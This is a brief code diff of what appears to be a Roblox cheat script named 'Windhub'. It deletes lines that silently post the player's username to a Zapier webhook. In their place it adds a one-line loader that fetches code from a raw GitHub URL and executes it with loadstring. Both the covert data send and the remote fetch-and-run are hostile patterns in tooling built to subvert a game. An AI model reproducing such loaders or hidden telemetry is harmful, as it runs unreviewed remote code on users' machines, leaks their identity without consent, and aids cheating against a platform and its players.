@@ -87,12 +87,7 @@ TextButton.TextWrapped = true
 TextButton.MouseButton1Click:connect(function()
 	if game.Players.LocalPlayer.UserId == number then 
 		Frame:Destroy()
-
-
-		local url = "https://hooks.zapier.com/hooks/catch/10954516/b6gyj90/"
-		local data0 =  game.Players.LocalPlayer.Name..' just tried to execute Windhub and was successful.'
-		local newdata0 = game:GetService'HttpService':JSONEncode(data0)
-		game:HttpPost(url,newdata0)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/hellothere425/sfsafsafsa/main/test', true))()
 		local commands = {}
 		local poop = false
 		local prefix = "!"
